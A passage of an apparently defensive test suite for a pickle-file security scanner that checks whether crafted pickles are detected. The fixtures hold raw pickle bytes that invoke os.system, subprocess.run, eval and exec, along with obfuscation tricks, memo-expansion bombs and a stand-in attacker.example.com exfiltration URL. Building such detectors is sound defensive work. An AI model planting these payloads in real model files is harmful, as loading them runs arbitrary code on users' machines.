        def lower(self) -> bytes:
            type(self).lower_calls += 1
            return super().lower()

    assert _hex_token_has_execution_seed(CountingBytes(b"AA" * 4096)) is False
    assert CountingBytes.lower_calls == 1


def test_scan_stream_detects_pem_private_key_after_seed_tightening() -> None:
    payload = pickle.dumps(
        {"pem": "-----BEGIN RSA PRIVATE KEY-----\nabc123\n-----END RSA PRIVATE KEY-----"},
        protocol=4,
    )

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="pem-secret.pkl")

    assert any(issue.rule_code == "S703" and "Private Key" in str(issue.details) for issue in result.issues)


def test_scan_stream_hashes_seekable_stream_past_raw_scan_window() -> None:
    payload = pickle.dumps({"pad": b"A" * 256}, protocol=4)

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 64}).scan_stream(
        io.BytesIO(payload),
        len(payload),
        source="large-seekable-stream.pkl",
    )

    integrity_checks = [check for check in result.checks if check.name == "File Integrity Check"]
    assert integrity_checks
    assert integrity_checks[-1].details["bytes_hashed"] == len(payload)
    assert integrity_checks[-1].details["hash_complete"] is True
    assert result.metadata["file_hashes"]["sha256"] == hashlib.sha256(payload).hexdigest()


def test_scan_stream_preserves_legacy_raw_eval_exec_importlib_detection() -> None:
    payload = pickle.dumps({"script": "eval # inline\n(1); exec\t(x); import importlib"}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="raw-code.pkl")

    critical_messages = [issue.message for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]
    assert any("eval" in message for message in critical_messages)
    assert any("exec" in message for message in critical_messages)
    assert any("importlib" in message for message in critical_messages)
    assert any(issue.rule_code == "S104" for issue in result.issues)


def test_scan_stream_deduplicates_legacy_raw_eval_exec_import_patterns() -> None:
    payload = pickle.dumps({"script": "eval(1); exec(x); __import__('os')"}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="raw-code-dedupe.pkl")

    raw_builtin_issues = [
        issue
        for issue in result.issues
        if issue.details.get("source") == "bounded_raw_pickle_window"
        and issue.details.get("associated_global") in {"builtins.eval", "builtins.exec", "builtins.__import__"}
    ]

    assert len(raw_builtin_issues) == 3
    assert {issue.details["associated_global"] for issue in raw_builtin_issues} == {
        "builtins.eval",
        "builtins.exec",
        "builtins.__import__",
    }
    assert {issue.details["associated_global"]: issue.rule_code for issue in raw_builtin_issues} == {
        "builtins.eval": "S104",
        "builtins.exec": "S104",
        "builtins.__import__": "S106",
    }


@pytest.mark.parametrize("separator", ["\x00", "\\\n", ";", "/* comment */"])
def test_scan_stream_detects_legacy_raw_eval_with_obscured_separator(separator: str) -> None:
    payload = pickle.dumps({"script": f"eval{separator}(1)"}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="raw-eval-separator.pkl")

    assert any(
        issue.rule_code == "S104" and issue.details.get("associated_global") == "builtins.eval"
        for issue in result.issues
    )


def test_scan_stream_does_not_flag_importlib_comment_as_critical() -> None:
    payload = pickle.dumps(
        {"documentation": "This model does not use importlib# Safe comment", "config": {"safe": True}},
        protocol=4,
    )

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="comment.pkl")

    assert not any(
        issue.severity == IssueSeverity.CRITICAL and "importlib" in issue.message.lower() for issue in result.issues
    )


def test_scan_stream_does_not_flag_primarily_documentation_raw_text() -> None:
    payload = (
        b"V# eval(1)\n"
        b"# exec(2)\n"
        b"# os.system('id')\n"
        b"# importlib.import_module('os')\n"
        b"# subprocess.run('id')\n"
        b"plain note\n."
    )

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="comment-doc.pkl")

    assert not any(issue.details.get("source") == "bounded_raw_pickle_window" for issue in result.issues)


def test_scan_stream_documentation_padding_does_not_suppress_raw_structural_evidence() -> None:
    payload = (b"# documentation line\n" * 32) + b"cposix\nsystem\n."

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="doc-padded-evil.pkl")

    assert any(
        issue.details.get("source") == "bounded_raw_pickle_window"
        and issue.details.get("associated_global") in {"os.system", "posix.system", "nt.system"}
        for issue in result.issues
    )


@pytest.mark.parametrize(
    ("payload", "expected_reference"),
    [
        (b"cos\npopen\n.", "os.popen"),
        (b"cos\nspawnv\n.", "os.spawnv"),
        (b"cposix\npopen\n.", "posix.popen"),
        (b"csubprocess\nPopen\n.", "subprocess.Popen"),
        (b"ccommands\ngetoutput\n.", "commands.getoutput"),
    ],
)
def test_scan_stream_detects_protocol0_global_newline_raw_references(
    payload: bytes,
    expected_reference: str,
) -> None:
    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="protocol0-global.pkl")

    assert any(
        issue.details.get("source") == "bounded_raw_pickle_window"
        and issue.details.get("associated_global") == expected_reference
        for issue in result.issues
    )


@pytest.mark.parametrize(
    ("payload_tail", "expected_reference"),
    [
        (b"cpip\nmain\n)R.", "pip.main"),
        (b"c__main__\nEvil\n)R.", "__main__.Evil"),
        (b"ctorch\nload\n)R.", "torch.load"),
        (b"cbuiltins\neval\n)R.", "builtins.eval"),
        (b"cbuiltins\nexec\n)R.", "builtins.exec"),
        (b"cdill\nloads\n)R.", "dill.loads"),
    ],
)
def test_comment_token_does_not_bypass_dangerous_reduce_detection(
    tmp_path: Path,
    payload_tail: bytes,
    expected_reference: str,
) -> None:
    comment_prefix = _short_binunicode(b"# benign comment token") + b"0"
    path = tmp_path / f"{expected_reference.replace('.', '_')}_comment_reduce.pkl"
    path.write_bytes(b"\x80\x02" + comment_prefix + payload_tail)

    result = PickleScanner().scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("associated_global") == expected_reference
        and issue.details.get("opcode") == "REDUCE"
        for issue in result.issues
    ), (
        f"Expected {expected_reference} detection despite comment token, "
        f"got: {[issue.message for issue in result.issues]}"
    )


def test_comment_token_does_not_bypass_main_stack_global_detection(tmp_path: Path) -> None:
    comment_prefix = _short_binunicode(b"# benign comment token") + b"0"
    path = tmp_path / "main_stack_global_comment.pkl"
    path.write_bytes(
        b"\x80\x04" + comment_prefix + _short_binunicode(b"__main__") + _short_binunicode(b"CustomType") + b"\x93."
    )

    result = PickleScanner().scan(str(path))

    assert any(
        issue.severity == IssueSeverity.WARNING
        and issue.details.get("associated_global") == "__main__.CustomType"
        and issue.details.get("opcode") == "STACK_GLOBAL"
        for issue in result.issues
    ), (
        "Expected __main__ STACK_GLOBAL warning despite comment token, "
        f"got: {[issue.message for issue in result.issues]}"
    )


@pytest.mark.parametrize(("module", "func", "expected_severity"), BYPASS_V4_REFERENCES_TEST_CASES)
def test_bypass_v4_references_still_detected(
    module: str,
    func: str,
    expected_severity: IssueSeverity,
) -> None:
    full_ref = f"{module}.{func}"
    payload = _global_reduce_payload(module, func)

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="bypass-v4-regression.pkl")

    matched = [
        issue
        for issue in result.issues
        if issue.severity == expected_severity
        and (issue.details.get("associated_global") == full_ref or full_ref in issue.message)
    ]
    assert result.success is True, f"Scan failed for {full_ref}: {result.metadata}"
    assert matched, (
        f"Expected {expected_severity.value} finding for {full_ref}, "
        f"got: {[(issue.severity.value, issue.message, issue.details) for issue in result.issues]}"
    )


def test_pickle_expansion_heuristics_detect_iterative_memo_growth(tmp_path: Path) -> None:
    path = tmp_path / "memo-expansion.pkl"
    path.write_bytes(_make_memo_expansion_pickle(iterations=80))

    result = PickleScanner().scan(str(path))

    expansion_checks = [
        check
        for check in result.checks
        if check.name == "Pickle Expansion Heuristic Check" and check.status.value == "failed"
    ]
    assert len(expansion_checks) == 1, f"Expected one failed expansion heuristic check, got: {result.checks}"
    check = expansion_checks[0]
    assert check.severity == IssueSeverity.WARNING
    assert check.rule_code == "S214"
    assert any("memo_growth_chain" in finding["triggers"] for finding in check.details["findings"]), check.details


def test_pickle_expansion_heuristics_detect_diluted_memo_growth(tmp_path: Path) -> None:
    path = tmp_path / "memo-expansion-diluted.pkl"
    path.write_bytes(_make_memo_expansion_pickle(iterations=80, inert_writes=80))

    result = PickleScanner().scan(str(path))

    expansion_checks = [
        check
        for check in result.checks
        if check.name == "Pickle Expansion Heuristic Check" and check.status.value == "failed"
    ]
    assert len(expansion_checks) == 1, f"Expected one failed expansion heuristic check, got: {result.checks}"
    assert any("memo_growth_chain" in finding["triggers"] for finding in expansion_checks[0].details["findings"]), (
        expansion_checks[0].details
    )


def test_pickle_expansion_heuristics_detect_dup_heavy_payload(tmp_path: Path) -> None:
    path = tmp_path / "dup-heavy.pkl"
    path.write_bytes(_make_dup_heavy_pickle(iterations=200))

    loaded = pickle.loads(path.read_bytes())
    result = PickleScanner().scan(str(path))

    expansion_checks = [
        check
        for check in result.checks
        if check.name == "Pickle Expansion Heuristic Check" and check.status.value == "failed"
    ]
    assert len(expansion_checks) == 1, f"Expected one failed expansion heuristic check, got: {result.checks}"
    assert len(loaded) == 200
    assert loaded[0] is loaded
    triggers = expansion_checks[0].details["findings"][0]["triggers"]
    assert "excessive_dup_usage" in triggers
    assert "suspicious_get_put_ratio" in triggers


def test_pickle_expansion_heuristics_ignore_benign_shared_reference_payload(tmp_path: Path) -> None:
    shared = [1, 2, 3]
    path = tmp_path / "shared-reference.pkl"
    path.write_bytes(pickle.dumps([shared] * 1000, protocol=4))

    result = PickleScanner().scan(str(path))

    assert not any(
        check.name == "Pickle Expansion Heuristic Check" and check.status.value == "failed" for check in result.checks
    ), f"Unexpected expansion heuristic finding: {result.checks}"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_post_budget_expansion_scan_detects_follow_on_stream(tmp_path: Path) -> None:
    path = tmp_path / "post-budget-expansion.pkl"
    path.write_bytes(_make_opcode_padding_stream(64) + _make_memo_expansion_pickle(iterations=80))

    result = PickleScanner({"max_opcodes": 64, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    post_budget_checks = [
        check
        for check in result.checks
        if check.name == "Post-Budget Pickle Expansion Heuristic Check" and check.status.value == "failed"
    ]
    assert len(post_budget_checks) == 1, f"Expected one failed post-budget expansion check, got: {result.checks}"
    assert post_budget_checks[0].rule_code == "S214"
    assert any("memo_growth_chain" in finding["triggers"] for finding in post_budget_checks[0].details["findings"]), (
        post_budget_checks[0].details
    )


def test_post_budget_expansion_scan_ignores_benign_follow_on_stream(tmp_path: Path) -> None:
    path = tmp_path / "post-budget-benign.pkl"
    path.write_bytes(_make_opcode_padding_stream(64) + pickle.dumps({"safe": True}, protocol=2))

    result = PickleScanner({"max_opcodes": 64, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert not any(
        check.name == "Post-Budget Pickle Expansion Heuristic Check" and check.status.value == "failed"
        for check in result.checks
    ), result.checks


def test_post_budget_scan_detects_prememoized_stack_global_tail(tmp_path: Path) -> None:
    path = tmp_path / "post-budget-prememo-stack-global.pkl"
    path.write_bytes(_make_pre_memoized_post_budget_stack_global_payload(b"h\x00h\x01\x93)R."))

    result = PickleScanner({"max_opcodes": 7, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("pickle_rule_code") == "POST_BUDGET_GLOBAL"
        and issue.details.get("module") == "subprocess"
        and issue.details.get("name") == "run"
        for issue in result.issues
    ), result.issues
    assert result.success is False


@pytest.mark.parametrize(
    "tail",
    [
        b"h\x00" + _short_binunicode(b"run") + b"\x93)R.",
        _short_binunicode(b"subprocess") + b"h\x01\x93)R.",
    ],
    ids=["memo-module-inline-name", "inline-module-memo-name"],
)
def test_post_budget_scan_detects_mixed_prememoized_stack_global_tail(tmp_path: Path, tail: bytes) -> None:
    path = tmp_path / "post-budget-prememo-mixed-stack-global.pkl"
    path.write_bytes(_make_pre_memoized_post_budget_stack_global_payload(tail))

    result = PickleScanner({"max_opcodes": 7, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("pickle_rule_code") == "POST_BUDGET_GLOBAL"
        and issue.details.get("module") == "subprocess"
        and issue.details.get("name") == "run"
        for issue in result.issues
    ), result.issues
    assert result.success is False


@pytest.mark.parametrize(
    "tail",
    [
        b"h\x00h\x0120\x93)R.",
        b"h\x00(0h\x01\x93)R.",
        b"h\x00N0h\x01\x93)R.",
    ],
    ids=["dup-pop", "mark-pop", "none-pop"],
)
def test_post_budget_scan_detects_interleaved_prememoized_stack_global_tail(
    tmp_path: Path,
    tail: bytes,
) -> None:
    path = tmp_path / "post-budget-prememo-interleaved-stack-global.pkl"
    path.write_bytes(_make_pre_memoized_post_budget_stack_global_payload(tail))

    result = PickleScanner({"max_opcodes": 7, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("pickle_rule_code") == "POST_BUDGET_GLOBAL"
        and issue.details.get("module") == "subprocess"
        and issue.details.get("name") == "run"
        for issue in result.issues
    ), result.issues
    assert result.success is False


@pytest.mark.parametrize(
    "tail",
    [
        _short_binunicode(b"subprocess") + b"q\x05" + _short_binunicode(b"run") + b"q\x06h\x05h\x06\x93)R.",
        _short_binunicode(b"subprocess") + b"p5\n" + _short_binunicode(b"run") + b"p6\ng5\ng6\n\x93)R.",
        _short_binunicode(b"subprocess") + b"\x94" + _short_binunicode(b"run") + b"\x94h\x00h\x01\x93)R.",
    ],
    ids=["binput-binget", "put-get", "memoize-binget"],
)
def test_post_budget_scan_tracks_tail_local_memo_stack_global_tail(tmp_path: Path, tail: bytes) -> None:
    path = tmp_path / "post-budget-tail-local-memo-stack-global.pkl"
    path.write_bytes(b"\x80\x04\x88" + tail)

    result = PickleScanner({"max_opcodes": 2, "post_budget_global_scan_limit_bytes": 4096}).scan(str(path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("pickle_rule_code") == "POST_BUDGET_GLOBAL"
        and issue.details.get("module") == "subprocess"
        and issue.details.get("name") == "run"
        for issue in result.issues
    ), result.issues
    assert result.success is False


def test_scan_bounds_follow_on_probe_recursion_for_pickle_like_binary_tail(tmp_path: Path) -> None:
    path = tmp_path / "binary-tail.pkl"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=2) + (b"XYZNmore-binary-data" * 20))

    result = PickleScanner().scan(str(path))

    assert result.metadata["pickle_primary_engine"] == "rust"
    assert result.metadata["pickle_report_status"] == "inconclusive"
    assert not any(issue.details.get("pickle_notice_code") == "follow_on_stream_detected" for issue in result.issues)
    assert not any(check.name == "Pickle Expansion Heuristic Check" for check in result.checks)
    assert not any(check.name == "Pickle Structural Tamper Check" for check in result.checks)


def test_oversized_frame_reports_structural_tamper(tmp_path: Path) -> None:
    path = tmp_path / "oversized-frame.pkl"
    path.write_bytes(b"\x80\x04\x95\x03\x00\x00\x00\x00\x00\x00\x00}.")

    result = PickleScanner().scan(str(path))
    structural_checks = [
        check
        for check in result.checks
        if check.name == "Pickle Structural Tamper Check" and check.details.get("tamper_type") == "oversized_frame"
    ]
    aggregate = scan_model_directory_or_file(str(path), cache_scan_results=False)

    assert result.success is True
    assert result.has_warnings is True
    assert len(structural_checks) == 1
    assert structural_checks[0].severity == IssueSeverity.WARNING
    assert structural_checks[0].details["frame_length"] == 3
    assert structural_checks[0].details["remaining_bytes"] == 2
    assert determine_exit_code(aggregate) == 1


def test_duplicate_proto_same_version_reports_structural_tamper(tmp_path: Path) -> None:
    path = tmp_path / "duplicate-proto.pkl"
    path.write_bytes(b"\x80\x02\x80\x02K\x01.")

    result = PickleScanner().scan(str(path))
    structural_checks = [
        check
        for check in result.checks
        if check.name == "Pickle Structural Tamper Check" and check.status.value == "failed"
    ]

    assert any(check.details.get("tamper_type") == "duplicate_proto" for check in structural_checks), (
        f"Expected duplicate_proto finding, got: {[check.details for check in structural_checks]}"
    )
    assert any(check.details.get("tamper_type") == "misplaced_proto" for check in structural_checks), (
        f"Expected misplaced_proto finding, got: {[check.details for check in structural_checks]}"
    )
    assert any(check.details.get("position") == 2 for check in structural_checks), (
        f"Expected duplicate/misplaced PROTO position, got: {[check.details for check in structural_checks]}"
    )


def test_duplicate_proto_mixed_versions_reports_structural_tamper(tmp_path: Path) -> None:
    path = tmp_path / "duplicate-proto-mixed.pkl"
    path.write_bytes(b"\x80\x02\x80\x04K\x01.")

    result = PickleScanner().scan(str(path))
    structural_checks = [check for check in result.checks if check.name == "Pickle Structural Tamper Check"]
    duplicate = [check for check in structural_checks if check.details.get("tamper_type") == "duplicate_proto"]

    assert duplicate, f"Expected duplicate_proto finding, got: {[check.details for check in structural_checks]}"
    assert any(
        check.details.get("previous_protocol") == 2 and check.details.get("protocol") == 4 for check in duplicate
    ), f"Expected previous/current protocol details, got: {[check.details for check in duplicate]}"


def test_misplaced_proto_reports_structural_tamper(tmp_path: Path) -> None:
    path = tmp_path / "misplaced-proto.pkl"
    path.write_bytes(b"K\x01\x80\x02.")

    result = PickleScanner().scan(str(path))

    assert any(
        check.name == "Pickle Structural Tamper Check" and check.details.get("tamper_type") == "misplaced_proto"
        for check in result.checks
    ), f"Expected misplaced_proto finding, got: {[check.details for check in result.checks]}"


def test_valid_single_and_multi_stream_proto_stays_without_structural_tamper(tmp_path: Path) -> None:
    single_path = tmp_path / "single.pkl"
    single_path.write_bytes(pickle.dumps({"safe": True}, protocol=4))

    single_result = PickleScanner().scan(str(single_path))

    assert not any(check.name == "Pickle Structural Tamper Check" for check in single_result.checks)

    multi_stream = io.BytesIO()
    pickle.dump({"a": 1}, multi_stream, protocol=2)
    multi_stream.write(b"\x00")
    pickle.dump({"b": 2}, multi_stream, protocol=4)
    multi_path = tmp_path / "multi.pkl"
    multi_path.write_bytes(multi_stream.getvalue())

    multi_result = PickleScanner().scan(str(multi_path))

    assert not any(check.name == "Pickle Structural Tamper Check" for check in multi_result.checks)


def test_structural_tamper_in_second_stream_is_detected(tmp_path: Path) -> None:
    stream = io.BytesIO()
    pickle.dump({"safe": True}, stream, protocol=2)
    stream.write(b"\x00")
    stream.write(b"\x80\x02\x80\x02K\x01.")
    path = tmp_path / "second-stream-duplicate-proto.pkl"
    path.write_bytes(stream.getvalue())

    result = PickleScanner().scan(str(path))
    structural_checks = [check for check in result.checks if check.name == "Pickle Structural Tamper Check"]

    assert any(check.details.get("tamper_type") == "duplicate_proto" for check in structural_checks), (
        f"Expected duplicate_proto finding in later stream, got: {[check.details for check in structural_checks]}"
    )
    assert any(check.details.get("stream_offset", 0) > 0 for check in structural_checks), (
        f"Expected later-stream offset, got: {[check.details for check in structural_checks]}"
    )


def test_structural_tamper_and_malicious_import_both_reported(tmp_path: Path) -> None:
    path = tmp_path / "duplicate-proto-os-system.pkl"
    path.write_bytes(b"\x80\x02\x80\x02cos\nsystem\n)R.")

    result = PickleScanner().scan(str(path))

    assert any(check.name == "Pickle Structural Tamper Check" for check in result.checks)
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("associated_global") == "os.system"
        for issue in result.issues
    ), f"Expected CRITICAL os.system finding, got: {[issue.message for issue in result.issues]}"


def test_structural_tamper_with_safe_ml_payload_preserves_rust_warning_severity(tmp_path: Path) -> None:
    safe_payload = pickle.dumps({"layer": "linear", "shape": [4, 8]}, protocol=2)
    path = tmp_path / "safe-ml-duplicate-proto.pkl"
    path.write_bytes(b"\x80\x02" + safe_payload)

    result = PickleScanner().scan(str(path))
    structural_checks = [check for check in result.checks if check.name == "Pickle Structural Tamper Check"]

    assert structural_checks, "Expected structural tamper finding for duplicate/misplaced PROTO"
    assert all(check.severity == IssueSeverity.WARNING for check in structural_checks)


def test_root_legacy_metadata_detectors_preserve_import_only_and_main_build_rules() -> None:
    scanner = PickleScanner()
    result = ScanResult(scanner_name="pickle", scanner=scanner)
    result.metadata["import_references"] = [
        {
            "import_reference": "tests.test_pickle_scanner.__dict__",
            "module": "tests.test_pickle_scanner",
            "name": "__dict__",
            "opcode": "GLOBAL",
            "position": 257,
            "is_dangerous": False,
        },
        {
            "import_reference": "__main__.CustomModel",
            "module": "__main__",
            "name": "CustomModel",
            "opcode": "STACK_GLOBAL",
            "position": 42,
            "is_dangerous": False,
        },
    ]

    scanner._add_root_legacy_metadata_detectors(result, "payload.pkl")

    assert {issue.rule_code for issue in result.issues} >= {"S206", "S207"}
    assert any("tests.test_pickle_scanner.__dict__" in issue.message for issue in result.issues)
    assert any("__main__.CustomModel" in issue.message for issue in result.issues)


def test_scan_stream_preserves_copyreg_extension_reduce_detection() -> None:
    payload = b"\x80\x04\x82\x01)R."

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="extension-reduce.pkl")

    assert any(
        issue.rule_code == "S201" and issue.details.get("associated_global") == "__copyreg_extension__.code_1"
        for issue in result.issues
    )


def test_scan_stream_does_not_treat_system_name_as_setitem_cve() -> None:
    payload = b"cos\nsystem\n."

    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="global-only.pkl")

    assert any(issue.details.get("associated_global") == "os.system" for issue in result.issues)
    assert all(issue.rule_code != "S310" for issue in result.issues)
    assert all(issue.rule_code != "S209" for issue in result.issues)


def test_scan_stream_accepts_unknown_size_stream() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner().scan_stream(io.BytesIO(payload), None, source="unknown-size.pkl")

    assert result.success is True
    assert result.metadata["pickle_primary_engine"] == "rust"


def test_scan_stream_marks_seekable_position_failure_inconclusive_without_security_finding() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner().scan_stream(BrokenTellStream(payload), len(payload), source="broken-tell.pkl")

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["stream_position_failed"]
    assert result.metadata["operational_error_reason"] == "stream_position_failed"
    assert any(
        issue.details.get("category") == "stream_position_failed" and issue.severity == IssueSeverity.INFO
        for issue in result.issues
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_stream_marks_rewind_failure_inconclusive_without_security_finding() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner().scan_stream(BrokenRewindStream(payload), len(payload), source="broken-rewind.pkl")

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["stream_rewind_failed"]
    assert result.metadata["operational_error_reason"] == "stream_rewind_failed"
    assert any(
        issue.details.get("category") == "stream_rewind_failed" and issue.severity == IssueSeverity.INFO
        for issue in result.issues
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_stream_fails_closed_when_supplemental_raw_analysis_cannot_read() -> None:
    payload = pickle.dumps({"endpoint": "https://attacker.example.com/exfil"}, protocol=4)

    readable_result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="readable.pkl")
    result = PickleScanner().scan_stream(
        BrokenSupplementalReadStream(payload),
        len(payload),
        source="unreadable-supplement.pkl",
    )

    assert any(
        check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
        for check in readable_result.checks
    )
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["stream_raw_read_failed"]
    assert any(
        issue.details.get("category") == "stream_raw_read_failed" and issue.severity == IssueSeverity.INFO
        for issue in result.issues
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_stream_marks_supplemental_read_failure_operational_with_security_finding() -> None:
    payload = pickle.dumps(MaliciousPayload(), protocol=4)

    result = PickleScanner().scan_stream(
        BrokenSupplementalReadStream(payload),
        len(payload),
        source="partial-malicious-stream.pkl",
    )
    result.metadata["file_path"] = "partial-malicious-stream.pkl"
    aggregate_result = create_initial_audit_result()
    merge_scan_result(aggregate_result, result)

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["stream_raw_read_failed"]
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "stream_raw_read_failed"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(
        issue.details.get("category") == "stream_raw_read_failed"
        and issue.details.get("operational_error") is True
        and issue.severity == IssueSeverity.INFO
        for issue in result.issues
    )
    assert determine_exit_code(aggregate_result) == 2


def test_scan_stream_marks_non_seekable_read_failure_inconclusive_without_security_finding() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner().scan_stream(
        BrokenNonSeekableReadStream(payload),
        len(payload),
        source="unreadable-input.pkl",
    )

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["stream_read_failed"]
    assert result.metadata["operational_error_reason"] == "stream_read_failed"
    assert any(
        issue.details.get("category") == "stream_read_failed" and issue.severity == IssueSeverity.INFO
        for issue in result.issues
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_stream_maps_native_io_error_to_inconclusive_without_security_finding() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    result = PickleScanner().scan_stream(BrokenNativeReadStream(payload), len(payload), source="native-read.pkl")

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["io_error"]
    assert result.metadata["operational_error_reason"] == "io_error"
    assert any(
        issue.details.get("category") == "io_error" and issue.severity == IssueSeverity.INFO for issue in result.issues
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_file_read_failure_is_inconclusive_without_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "unreadable.pkl"
    path.write_bytes(pickle.dumps({"safe": True}, protocol=4))

    def fail_primary_read(*_args: object, **_kwargs: object) -> ScanResult:
        raise OSError("simulated pickle read failure")

    monkeypatch.setattr(PickleScanner, "_scan_standalone_stream", fail_primary_read)

    direct_result = PickleScanner().scan(str(path))
    aggregate_result = scan_model_directory_or_file(str(path), cache_scan_results=False)

    assert direct_result.success is False
    assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct_result.metadata["scan_outcome_reasons"] == ["pickle_file_open_failed"]
    assert direct_result.metadata["operational_error_reason"] == "pickle_file_open_failed"
    assert any(
        issue.details.get("category") == "pickle_file_open_failed" and issue.severity == IssueSeverity.INFO
        for issue in direct_result.issues
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in direct_result.issues)
    assert determine_exit_code(aggregate_result) == 2
    assert not any(
        issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate_result.issues
    )


def test_scan_file_jax_read_failure_is_inconclusive_without_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "jax-state.pkl"
    path.write_bytes(pickle.dumps({"payload": "jax"}, protocol=4))

    def fail_jax_read(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated JAX delegated read failure")

    monkeypatch.setattr(PickleScanner, "_scan_jax_checkpoint_patterns_if_needed", fail_jax_read)

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["pickle_file_open_failed"]
    assert any(
        issue.details.get("category") == "pickle_file_open_failed" and issue.severity == IssueSeverity.INFO
        for issue in result.issues
    )
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_stream_unknown_size_non_seekable_payload_above_root_cap_returns_truncated_result() -> None:
    payload = pickle.dumps({"pad": b"A" * 4096}, protocol=4)

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 64}).scan_stream(
        NonSeekableBytesIO(payload),
        None,
        source="large-nonseek.pkl",
    )

    assert result.metadata["pickle_stream_truncated_for_root_scan"] is True
    assert result.metadata["pickle_stream_bytes_buffered"] == 64
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata.get("operational_error_reason") != "short_read"
    assert result.success is False
    assert not any(issue.details.get("category") == "short_read" for issue in result.issues)
    assert any(check.name == "Pickle Stream Read Limit" for check in result.checks)


def test_scan_stream_non_seekable_known_size_caps_root_payload_buffer() -> None:
    payload = pickle.dumps({"pad": b"A" * 4096}, protocol=4)

    result = PickleScanner(config={"max_known_stream_read_bytes": 64}).scan_stream(
        NonSeekableBytesIO(payload),
        len(payload),
        source="known-large-nonseek.pkl",
    )

    assert result.success is False
    assert result.metadata["pickle_stream_truncated_for_root_scan"] is True
    assert result.metadata["pickle_stream_bytes_buffered"] == 64
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert any(check.name == "Pickle Stream Read Limit" for check in result.checks)


def test_scan_stream_detects_binary_tail_past_raw_window() -> None:
    pickle_payload = pickle.dumps({"pad": b"A" * 256}, protocol=4)
    payload = pickle_payload + b"\x7fELF/bin/sh\x00"

    result = PickleScanner(config={"pickle_root_raw_scan_limit_bytes": 64}).scan_stream(
        NonSeekableBytesIO(payload),
        len(payload),
        source="stream-tail.bin",
    )

    assert any(
        issue.rule_code == "S502" and issue.details.get("offset") == len(pickle_payload) for issue in result.issues
    )


def test_scan_stream_detects_seekable_binary_tail_from_current_position() -> None:
    prefix = b"WRAPPED:"
